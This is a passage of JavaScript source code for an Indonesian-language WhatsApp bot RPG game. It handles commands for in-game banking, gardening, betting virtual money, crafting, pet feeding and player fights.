        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          if (!q)
            return reply(`_*Anda Tidak Menginput Jumlah Uang Yang Ingin Ditarik*_

- _*${prefix}${command} jumlah*_
- _*${prefix}${command} all*_

\`${prefix}${command} 10000\``);
          const xpperlimit = 1;
          let user = db.data.users[m.sender];
          count = q.toLowerCase() === "all" ? user.bank : parseInt(q);
          count = Math.min(user.bank, count);
          if (count <= 0)
            return reply("Kamu tidak memiliki cukup uang untuk menabung.");
          if (user.atm == 0) return reply("kamu belum mempuyai kartu ATM !");
          if (user.bank >= xpperlimit * count) {
            user.bank -= xpperlimit * count;
            user.money += count;
            reply(`Sukses menarik sebesar ${count} Money 💹`);
          } else {
            return;
          }
        }
        break;

      case "berkebon":
        {
          if (!m.isGroup) return reply(mess.OnlyGrup);
          function clockString(ms) {
            let h = Math.floor(ms / 3600000);
            let m = Math.floor(ms / 60000) % 60;
            let s = Math.floor(ms / 1000) % 60;
            return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
          }
          const timeout = 1800000;
          let __timers = new Date() - db.data.users[m.sender].lastberkebon;
          let _timers = timeout - __timers;
          let timers = clockString(_timers);
          let user = db.data.users[m.sender];
          let { stock } = db.data.settings[botNumber];
          let pisang = 100 - user.bibitpisang;
          let anggur = 100 - user.bibitanggur;
          let mangga = 100 - user.bibitmangga;
          let jeruk = 100 - user.bibitjeruk;
          let apel = 100 - user.bibitapel;
          let kerja = "Berkebun";
          let id = (m.chat.misi = Kilianhst.misi ? Kilianhst.misi : {});
          if (id in Kilianhst.misi) {
            reply(`Selesaikan Misi ${Kilianhst.misi[id][0]} Terlebih Dahulu`);
            return false;
          }
          let caption = `
📮 Kamu Membutuhkan Bibit:\n${
            user.bibitpisang < 100
              ? `\n${global.rpg.emoticon("bibitpisang")} BibitPisang: ${pisang}`
              : ""
          } ${
            user.bibitanggur < 100
              ? `\n${global.rpg.emoticon("bibitanggur")} BibitAnggur: ${anggur}`
              : ""
          } ${
            user.bibitmangga < 100
              ? `\n${global.rpg.emoticon("bibitmangga")} BibitMangga: ${mangga}`
              : ""
          } ${
            user.bibitjeruk < 100
              ? `\n${global.rpg.emoticon("bibitjeruk")} BibitJeruk: ${jeruk}`
              : ""
          } ${
            user.bibitapel < 100
              ? `\n${global.rpg.emoticon("bibitapel")} BibitApel: ${apel}`
              : ""
          }`.trim();
          if (new Date() - user.lastberkebon > 1800000) {
            if (
              user.bibitpisang >= 100 &&
              user.bibitanggur >= 100 &&
              user.bibitmangga >= 100 &&
              user.bibitapel >= 100 &&
              user.bibitjeruk >= 100
            ) {
              let hasil1 = Math.floor(Math.random() * 100);
              let hasil2 = Math.floor(Math.random() * 100);
              let hasil3 = Math.floor(Math.random() * 100);
              let hasil4 = Math.floor(Math.random() * 100);
              let hasil5 = Math.floor(Math.random() * 100);

              let caption = `⌛ Hasil Panen Kamu

${global.rpg.emoticon("pisang")} Pisang: ${hasil1}
${global.rpg.emoticon("anggur")} Anggur ${hasil2}
${global.rpg.emoticon("mangga")} Mangga: ${hasil3}
${global.rpg.emoticon("jeruk")} Jeruk: ${hasil4}
${global.rpg.emoticon("apel")} Apel: ${hasil5}
`;
              user.pisang += hasil1;
              user.anggur += hasil2;
              user.mangga += hasil3;
              user.jeruk += hasil4;
              user.apel += hasil5;

              user.bibitpisang -= 100;
              user.bibitanggur -= 100;
              user.bibitmangga -= 100;
              user.bibitjeruk -= 100;
              user.bibitapel -= 100;

              stock.bibitpisang += 100;
              stock.bibitanggur += 100;
              stock.bibitmangga += 100;
              stock.bibitjeruk += 100;
              stock.bibitapel += 100;

              Kilianhst.misi[id] = [
                kerja,
                setTimeout(() => {
                  delete Kilianhst.misi[id];
                }, 20000),
              ];

              setTimeout(() => {
                reply(`${caption.trim()}`);
              }, 20000);

              setTimeout(() => {
                reply("Sedang Menanam Bibit...");
              }, 0);
              user.lastberkebon = new Date() * 1;
            } else reply(`${caption}`);
          } else
            reply(`Mohon Menunggu Selama ${timers} Untuk Berkebun Kembali...`);
        }
        break;

      case "bet":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          function number(x = 0) {
            x = parseInt(x);
            return !isNaN(x) && typeof x == "number";
          }
          const items = ["money", "chip"];
          let user = db.data.users[m.sender];
          let item = items.filter(
            (v) => v in user && typeof user[v] == "number"
          );
          let type = (args[0] || "").toLowerCase();
          let count =
            (args[1] && number(parseInt(args[1]))
              ? Math.max(parseInt(args[1]), 1)
              : /all/i.test(args[1])
              ? Math.floor(parseInt(user[type]))
              : 1) * 1;
          if (!item.includes(type))
            return reply(
              `*List Item:*\n${item
                .map((v) => `${global.rpg.emoticon(v)}${v}`.trim())
                .join("\n")}\n\nExample:\nbet money 100000`
            );
          if (user[type] * 1 < count)
            return reply(
              `*${type} ${global.rpg.emoticon(type)}* kamu tidak cukup!!`
            );
          let moneyDulu = user[type] * 1;
          let txt = (
            m.msg && m.msg.selectedDisplayText
              ? m.msg.selectedDisplayText
              : m.text
              ? m.text
              : ""
          ).toLowerCase();
          try {
            let Bot = Math.ceil(Math.random() * 91) * 1;
            let Kamu = Math.floor(Math.random() * 71) * 1;
            let status = "Kalah";
            if (Bot < Kamu) {
              user[type] += count * 1;
              status = "Menang";
            } else if (Bot > Kamu) {
              user[type] -= count * 1;
            } else {
              status = "Seri";
              user[type] += Math.floor(count / 1.5) * 1;
            }
            reply(
              `
| *PLAYERS* | *POINT* |
*🤖 BOT:* {Bot}
*👤 KAMU:* ${Kamu}

Kamu *${status}*, kamu ${
                status == "Menang"
                  ? `Mendapatkan *+${count * 2}*`
                  : status == "Kalah"
                  ? `Kehilangan *-${count * 1}*`
                  : `Mendapatkan *+${Math.floor(count / 1.5)}*`
              } *${type} ${global.rpg.emoticon(type)}*
`.trim()
            );
          } catch (e) {
            if (moneyDulu > user[type] * 1) user[type] = moneyDulu * 1;
            reply("Error saat melakukan judi (Rejected)");
          }
        }
        break;

      case "claim":
      case "bonus":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          function msToTime(duration) {
            var milliseconds = parseInt((duration % 1000) / 100),
              seconds = Math.floor((duration / 1000) % 60),
              minutes = Math.floor((duration / (1000 * 60)) % 60),
              hours = Math.floor((duration / (1000 * 60 * 60)) % 24);
            hours = hours < 10 ? "0" + hours : hours;
            minutes = minutes < 10 ? "0" + minutes : minutes;
            seconds = seconds < 10 ? "0" + seconds : seconds;

            return hours + " jam " + minutes + " menit " + seconds + " detik";
          }
          let user = db.data.users[m.sender];
          let time = user.lastbonus + 86400000;
          if (new Date() - user.lastbonus < 86400000)
            return reply(
              `Kamu Sudah Ambil Bonus Hari Ini\nTunggu selama ${msToTime(
                time - new Date()
              )} lagi`
            );
          let money = Math.floor(Math.random() * 50000000);
          user.money += money * 1;
          user.lastbonus = new Date() * 1;
          reply(`Selamat Kamu Mendapatkan Bonus : \n+${money} Money`);
        }
        break;

      case "buah":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          let user = db.data.users[m.sender];
          let ini_txt = `[ *GUDANG BUAH KAMU* ]\n\n`;
          ini_txt += `🍌 ${user.pisang} Pisang\n`;
          ini_txt += `🍇 ${user.anggur} Anggur\n`;
          ini_txt += `🥭 ${user.mangga} Mangga\n`;
          ini_txt += `🍊 ${user.jeruk} Jeruk\n`;
          ini_txt += `🍎 ${user.apel} Apel\n\n`;
          ini_txt += `Gunakan command *buah sell* untuk menjual.`;
          reply(`${ini_txt}`);
        }
        break;

      case "bunuh":
      case "hitman":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          function clockString(ms) {
            let h = Math.floor(ms / 3600000);
            let m = Math.floor(ms / 60000) % 60;
            let s = Math.floor(ms / 1000) % 60;
            return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
          }
          let __timers = new Date() - db.data.users[m.sender].lastmisi;
          let _timers = 3600000 - __timers;
          let order = db.data.users[m.sender].ojekk;
          let timers = clockString(_timers);
          let name = Kilianhst.getName(m.sender);
          let user = db.data.users[m.sender];
          let id = m.sender;
          let kerja = "Bunuh";
          Kilianhst.misi = Kilianhst.misi ? Kilianhst.misi : {};
          if (id in Kilianhst.misi) {
            reply(`Selesaikan Misi ${Kilianhst.misi[id][0]} Terlebih Dahulu`);
            throw false;
          }
          if (new Date() - db.data.users[m.sender].lastmisi > 3600000) {
            let randomaku4 = Math.floor(Math.random() * 10);
            let randomaku5 = Math.floor(Math.random() * 10);

            let rbrb4 = randomaku4 * 100000;
            let rbrb5 = randomaku5 * 1000;

            var dimas = `
🕵️ Mendapatkan Target.....
`.trim();

            var dimas2 = `
⚔️ Menusuk Tubuhnya.....
`.trim();

            var dimas3 = `
☠️ Target meninggal\nDan kamu mengambil barang² nya
`.trim();

            var dimas4 = `
💼 Hasil dari membunuh....
`.trim();

            var hsl = `
*—[ Hasil ${name} ]—*
➕ 💹 Uang = [ ${rbrb4} ]
➕ ✨ Exp = [ ${rbrb5} ]
➕ 👮 Pelanggaran +1
➕ ☑️ Misi Berhasil = +1
➕ 📥Total Misi Sebelumnya : ${order}
`.trim();

            user.money += rbrb4;
            user.exp += rbrb5;
            user.ojekk += 1;
            user.warn += 1;

            Kilianhst.misi[id] = [
              kerja,
              setTimeout(() => {
                delete Kilianhst.misi[id];
              }, 27000),
            ];
            setTimeout(() => {
              reply(`${hsl}`);
            }, 27000);

            setTimeout(() => {
              reply(`${dimas4}`);
            }, 25000);

            setTimeout(() => {
              reply(`${dimas3}`);
            }, 20000);

            setTimeout(() => {
              reply(`${dimas2}`);
            }, 15000);

            setTimeout(() => {
              reply(`${dimas}`);
            }, 10000);

            setTimeout(() => {
              reply("🔍Mencari Target pembunuhan.....");
            }, 0);
            user.lastmisi = new Date() * 1;
          } else
            reply(
              `Silahkan , 0nggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`
            );
        }
        break;

      case "collect":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          function clockString(ms) {
            let h = Math.floor(ms / 3600000);
            let m = Math.floor(ms / 60000) % 60;
            let s = Math.floor(ms / 1000) % 60;
            console.log({ ms, h, m, s });
            return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
          }
          let __timers = new Date() - db.data.users[m.sender].lastclaim;
          let _timers = 43200000 - __timers;
          let timers = clockString(_timers);
          let user = db.data.users[m.sender];
          if (new Date() - db.data.users[m.sender].lastclaim > 43200000) {
            reply(
              `Kamu sudah mengclaim dan mendapatkan *1000* 💵money dan *1* 🥤potion`
            );
            user.money += 1000;
            user.potion += 1;
            user.lastclaim = new Date() * 1;
          } else
            reply(`silahkan tunggu *${timers}* lagi untuk bisa mengclaim lagi`);
        }
        break;

      case "craft":
      case "crafting":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          let type = (args[0] || "").toLowerCase();
          let _type = (args[0] || "").toLowerCase();
          let user = db.data.users[m.sender];
          let { stock } = db.data.settings[botNumber];

          let caption = `
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█

Gunakan Format *${command} [type]*
contoh *${command} pickaxe*

*乂 List Yang Bisa Di Craft*
*乂 Pickaxe ⛏️
*乂 Sword ⚔️
*乂 Fishingrod 🎣
*乂 Armor 🥼
*乂 Atm 💳

*乂 Recipe*
*乂 Pickaxe ⛏️
〉 10 Kayu
〉 5 Batu
〉 5 Iron
〉 20 String

*乂 Sword ⚔️
〉 10 Kayu
〉 15 Iron

*乂 Fishingrod 🎣
〉 10 Kayu
〉 2 Iron
〉 20 String

*乂 Armor 🥼
〉 30 Iron
〉 1 Emerald
〉 5 Diamond

*乂 Atm 💳
〉3 Emerald
〉6 Diamond
〉10k Money
`;
          try {
            if (/craft|Crafting/i.test(command)) {
              const count =
                args[1] && args[1].length > 0
                  ? Math.min(99999999, Math.max(parseInt(args[1]), 1))
                  : !args[1] || args.length < 3
                  ? 1
                  : Math.min(1, count);
              switch (type) {
                case "pickaxe":
                  if (user.pickaxe > 0) return reply("Kamu sudah memilik ini");
                  if (
                    user.rock < 5 ||
                    user.wood < 10 ||
                    user.iron < 5 ||
                    user.string < 20
                  )
                    return reply(
                      `Barang tidak cukup!\nUntuk membuat pickaxe. Kamu memerlukan : ${
                        user.wood < 10 ? `\n${10 - user.wood} kayu🪵` : ""
                      } ${user.iron < 5 ? `\n${5 - user.iron} iron⛓` : ""}${
                        user.string < 20 ? `\n${20 - user.string} String🕸️` : ""
                      }${user.rock < 5 ? `\n${5 - user.rock} Batu 🪨` : ""}`
                    );
                  user.wood -= 10;
                  stock.wood += 10;

                  user.iron -= 5;
                  stock.iron += 5;

                  user.rock -= 5;
                  stock.rock += 5;

                  user.string -= 20;
                  stock.string += 20;

                  user.pickaxe += 1;
                  user.pickaxedurability = 40;
                  reply("Sukses membuat 1 pickaxe 🔨");
                  break;

                case "sword":
                  if (user.sword > 0) return reply("Kamu sudah memilik ini");
                  if (user.wood < 10 || user.iron < 15)
                    return reply(
                      `Barang tidak cukup!\nUntuk membuat sword. Kamu memerlukan :${
                        user.wood < 10 ? `\n${10 - user.wood} kayu🪵` : ""
                      }${user.iron < 15 ? `\n${15 - user.iron} iron⛓️` : ""}`
                    );
                  user.wood -= 10;
                  stock.wood += 10;

                  user.iron -= 15;
                  stock.iron += 15;

                  user.sword += 1;
                  user.sworddurability = 40;
                  reply("Sukses membuat 1 sword 🗡️");
                  break;

                case "fishingrod":
                  if (user.fishingrod > 0)
                    return reply("Kamu sudah memilik ini");
                  if (user.wood < 20 || user.iron < 5 || user.string < 20)
                    return reply(
                      `Barang tidak cukup!\nUntuk membuat pancingan. Kamu memerlukan :${
                        user.wood < 20 ? `\n${20 - user.wood} kayu🪵` : ""
                      }${user.iron < 5 ? `\n${5 - user.iron} iron⛓` : ""}${
                        user.string < 20 ? `\n${20 - user.string} String🕸️` : ""
                      }`
                    );
                  user.wood -= 10;
                  stock.wood += 10;

                  user.iron -= 2;
                  stock.iron += 2;

                  user.string -= 20;
                  stock.string += 20;

                  user.fishingrod += 1;
                  user.fishingroddurability = 40;
                  reply("Sukses membuat 1 Pancingan 🎣");
                  break;

                case "armor":
                  if (user.armor > 0) return reply("Kamu sudah memilik ini");
                  if (user.iron < 30 || user.emerald < 1 || user.diamond < 5)
                    return reply(
                      `Barang tidak cukup!\nUntuk membuat armor. Kamu memerlukan :${
                        user.iron < 30 ? `\n${30 - user.iron} Iron ⛓️` : ""
                      }${
                        user.emerald < 1
                          ? `\n${1 - user.emerald} Emerald ❇️`
                          : ""
                      }${
                        user.diamond < 5
                          ? `\n${5 - user.diamond} Diamond 💎`
                          : ""
                      }`
                    );
                  user.emerald -= 1;
                  stock.emerald += 1;

                  user.iron -= 30;
                  stock.iron += 30;

                  user.diamond -= 5;
                  stock.diamond += 5;

                  user.armor += 1;
                  user.armordurability = 50;
                  reply("Sukses membuat 1 Armor 🥼");
                  break;

                case "atm":
                  if (user.atm > 0) return reply("Kamu sudah memilik ini");
                  if (
                    user.emerald < 3 ||
                    user.money < 10000 ||
                    user.diamond < 6
                  )
                    return reply(
                      `Barang tidak cukup!\nUntuk membuat atm. Kamu memerlukan :${
                        user.money < 10000
                          ? `\n${10000 - user.money} Money 💹`
                          : ""
                      }${
                        user.emerald < 3
                          ? `\n${3 - user.emerald} Emerald ❇️`
                          : ""
                      }${
                        user.diamond < 6
                          ? `\n${6 - user.diamond} Diamond 💎`
                          : ""
                      }`
                    );
                  user.emerald -= 3;
                  stock.emerald += 3;

                  user.diamond -= 6;
                  stock.diamond += 6;

                  user.money -= 10000;
                  user.atm += 1;
                  user.fullatm = 500000000;
                  reply("Sukses membuat 1 Atm 💳");
                  break;
                default:
                  return await reply(`${caption}`);
              }
            }
          } catch (err) {
            reply("Error\n\n\n" + err.stack);
          }
        }
        break;

      case "feed":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          function clockString(ms) {
            let h = isNaN(ms) ? "--" : Math.floor(ms / 310000);
            let m = isNaN(ms) ? "--" : Math.floor(ms / 60000) % 60;
            let s = isNaN(ms) ? "--" : Math.floor(ms / 1000) % 60;
            return [h, " H ", m, " M ", s, " S"]
              .map((v) => v.toString().padStart(2, 0))
              .join("");
          }

          let info = `
乂 List Pet:
🐈 • Cᴀᴛ
🐕 • Dᴏɢ
🐎 • Hᴏʀsᴇ
🦊 • Fᴏx
🤖 • Rᴏʙᴏ

*➠ Example:* ${command}fcat
`.trim();
          let pesan = pickRandom([
            "ɴʏᴜᴍᴍᴍ~",
            "ᴛʜᴀɴᴋs",
            "ᴛʜᴀɴᴋʏᴏᴜ ^-^",
            "...",
            "ᴛʜᴀɴᴋ ʏᴏᴜ~",
            "ᴀʀɪɢᴀᴛᴏᴜ ^-^",
          ]);
          let type = (args[0] || "").toLowerCase();
          let emo =
            type == "fox"
              ? "🦊"
              : "" || type == "cat"
              ? "🐈"
              : "" || type == "dog"
              ? "🐕"
              : "" || type == "horse"
              ? "🐴"
              : "" || type == "robo"
              ? "🤖"
              : "";
          let user = db.data.users[m.sender];
          let rubah = db.data.users[m.sender].fox;
          let kuda = db.data.users[m.sender].horse;
          let kucing = db.data.users[m.sender].cat;
          let anjing = db.data.users[m.sender].dog;
          let robot = db.data.users[m.sender].robo;
          switch (type) {
            case "fox":
              if (rubah == 0) return reply("ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!");
              if (rubah == 10) return reply("ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !");
              let __waktur = new Date() - user.foxlastfeed;
              let _waktur = 10000 - __waktur;
              let waktur = clockString(_waktur);
              if (new Date() - user.foxlastfeed > 10000) {
                if (user.petfood > 0) {
                  user.petfood -= 1;
                  user.foxexp += 20;
                  user.foxlastfeed = new Date() * 1;
                  reply(
                    `ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`
                  );
                  if (rubah > 0) {
                    let naiklvl = rubah * 100 - 1;
                    if (user.foxexp > naiklvl) {
                      user.fox += 1;
                      user.foxexp -= rubah * 100;
                      reply(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`);
                    }
                  }
                } else reply(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`);
              } else
                reply(
                  `ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${waktur}*`
                );
              break;

            case "cat":
              if (kucing == 0) return reply("ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!");
              if (kucing == 10) return reply("ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !");
              let __waktuc = new Date() - user.catlastfeed;
              let _waktuc = 10000 - __waktuc;
              let waktuc = clockString(_waktuc);
              if (new Date() - user.catlastfeed > 10000) {
                if (user.petfood > 0) {
                  user.petfood -= 1;
                  user.catexp += 20;
                  user.catlastfeed = new Date() * 1;
                  reply(
                    `ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`
                  );

                  if (kucing > 0) {
                    let naiklvl = kucing * 100 - 1;
                    if (user.catexp > naiklvl) {
                      user.cat += 1;
                      user.catexp -= kucing * 100;
                      reply(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`);
                    }
                  }
                } else reply(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`);
              } else
                reply(
                  `ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${waktuc}*`
                );
              break;

            case "dog":
              if (anjing == 0) return reply("ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!");
              if (anjing == 10) return reply("ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !");
              let __waktua = new Date() - user.doglastfeed;
              let _waktua = 10000 - __waktua;
              let waktua = clockString(_waktua);
              if (new Date() - user.doglastfeed > 10000) {
                if (user.petfood > 0) {
                  user.petfood -= 1;
                  user.dogexp += 20;
                  user.doglastfeed = new Date() * 1;
                  reply(
                    `ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`
                  );
                  if (anjing > 0) {
                    let naiklvl = anjing * 100 - 1;
                    if (user.dogexp > naiklvl) {
                      user.dog += 1;
                      user.dogexp -= anjing * 100;
                      reply(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`);
                    }
                  }
                } else reply(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`);
              } else
                reply(
                  `ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${waktua}*`
                );
              break;

            case "horse":
              if (kuda == 0) return reply("ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!");
              if (kuda == 10) return reply("ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !");
              let __waktuk = new Date() - user.horselastfeed;
              let _waktuk = 10000 - __waktuk;
              let waktuk = clockString(_waktuk);
              if (new Date() - user.horselastfeed > 10000) {
                if (user.petfood > 0) {
                  user.petfood -= 1;
                  user.horseexp += 20;
                  user.horselastfeed = new Date() * 1;
                  reply(
                    `ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`
                  );
                  if (kuda > 0) {
                    let naiklvl = kuda * 100 - 1;
                    if (user.horseexp > naiklvl) {
                      user.horse += 1;
                      user.horseexp -= kuda * 100;
                      reply(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`);
                    }
                  }
                } else reply(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`);
              } else
                reply(
                  `ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${waktuk}*`
                );
              break;

            case "robo":
              if (robot == 0) return reply("ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!");
              if (robot == 10) return reply("ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !");
              let __wakturb = new Date() - user.robolastfeed;
              let _wakturb = 10000 - __wakturb;
              let wakturb = clockString(_wakturb);
              if (new Date() - user.robolastfeed > 10000) {
                if (user.petfood > 0) {
                  user.petfood -= 1;
                  user.roboexp += 20;
                  user.robolastfeed = new Date() * 1;
                  reply(
                    `ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`
                  );
                  if (robot > 0) {
                    let naiklvl = robot * 100 - 1;
                    if (user.roboexp > naiklvl) {
                      user.robo += 1;
                      user.roboexp -= robot * 100;
                      reply(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`);
                    }
                  }
                } else reply(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`);
              } else
                reply(
                  `ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${wakturb}*`
                );
              break;
            default:
              return reply(`${info}`);
          }
        }
        break;

      case "fighting":
      case "fight":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          Kilianhst.fight = Kilianhst.fight ? Kilianhst.fight : {};
          let user = db.data.users[m.sender];
          if (
            typeof Kilianhst.fight[m.sender] != "undefined" &&
            Kilianhst.fight[m.sender] == true
          )
            return reply(`Kamu masih bertarung.`);
          let users = participants.map((a) => a.id);
          var lawan;
          lawan = users[Math.floor(users.length * Math.random())];
          while (
            typeof db.data.users[lawan] == "undefined" ||
            lawan == m.sender
          ) {
            lawan = users[Math.floor(users.length * Math.random())];
          }
          reply(
            `*Kamu* (level ${user.level}) menantang *${Kilianhst.getName(
              lawan
            )}* (level ${
              db.data.users[lawan].level
            }) dan sedang dalam pertarungan.\n\nTunggu 5 menit lagi dan lihat siapa yg menang.`
          );
          Kilianhst.fight[m.sender] = true;
          await delay(300000);
          let kesempatan = [];
          for (let i = 0; i < user.level; i++) kesempatan.push(m.sender);
          for (let i = 0; i < db.data.users[lawan].level; i++)
            kesempatan.push(lawan);
          let pointPemain = 0;
          let pointLawan = 0;
          for (let i = 0; i < 10; i++) {
            let unggul = getRandom(0, kesempatan.length - 1);
            if (kesempatan[unggul] == m.sender) pointPemain += 1;
            else pointLawan += 1;
          }
          if (pointPemain > pointLawan) {
            let hadiah = (pointPemain - pointLawan) * 10000;
            user.money += hadiah;
            user.limit += 1;
            reply(
              `*${Kilianhst.getName(m.sender)}* [${pointPemain * 10}] - [${
                pointLawan * 10
              }] *${Kilianhst.getName(lawan)}*\n\n*Kamu* (level ${
                user.level
              }) menang melawan *${Kilianhst.getName(lawan)}* (level ${
                db.data.users[lawan].level
              }) karena kamu ${
                alasanMenang[getRandom(0, alasanMenang.length - 1)]
              }\n\nHadiah . ${hadiah.toLocaleString()}\n+1 Limit`
            );
          } else if (pointPemain < pointLawan) {
            let denda = (pointLawan - pointPemain) * 100000;
            user.money -= denda;
            user.limit += 1;
            reply(
              `*${Kilianhst.getName(m.sender)}* [${pointPemain * 10}] - [${
                pointLawan * 10
              }] *${Kilianhst.getName(lawan)}*\n\n*Kamu* (level ${
                user.level
              }) kalah melawan *${Kilianhst.getName(lawan)}* (level ${
                db.data.users[lawan].level
              }) karena kamu ${
                alasanKalah[getRandom(0, alasanKalah.length - 1)]
              }\n\nMoney kamu berkurang ${denda.toLocaleString()}\n+1 Limit`
            );
          } else {
            reply(
              `*${Kilianhst.getName(m.sender)}* [${pointPemain * 10}] - [${
                pointLawan * 10
              }] *${Kilianhst.getName(
                lawan
              )}*\n\nHasil imbang kak, ga dapet apa apa`
            );
          }
          delete Kilianhst.fight[m.sender];
        }
        break;

      case "gajian":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          function JaM(ms) {
            let h = isNaN(ms) ? "60" : Math.floor(ms / 3600000) % 60;
            return [h].map((v) => v.toString().padStart(2, 0)).join(":");
          }

          function MeNit(ms) {
            let m = isNaN(ms) ? "60" : Math.floor(ms / 60000) % 60;
